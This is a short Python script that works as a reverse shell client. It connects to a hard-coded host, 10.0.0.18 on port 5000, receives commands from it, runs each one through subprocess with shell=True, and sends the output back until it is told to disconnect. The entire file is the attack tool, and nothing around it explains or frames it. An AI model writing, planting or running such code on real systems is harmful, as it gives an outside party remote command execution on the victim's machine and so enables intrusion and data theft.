import socket
import subprocess
import os

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect(('10.0.0.18', 5000))

def send(msg):
    msg = msg.encode("utf-8")
    socket.send(msg)

def disconnect():
    msg = "The end is near".encode("utf-8")
    socket.send(msg)

while True:
    cmd = socket.recv(1024)

    cmd = cmd.decode("utf-8")

    if cmd == "disconnect":
        break

    cmd_format = [x for x in cmd.split(" ") if x != ""]
    
    if cmd_format[0] == "cd":
        os.chdir(cmd_format[1])

    result = subprocess.run(cmd_format, stdout=subprocess.PIPE, shell=True)
    text = result.stdout.decode()

    if text == "":
        text = "No output"

    socket.send(text.encode("utf-8"))

disconnect()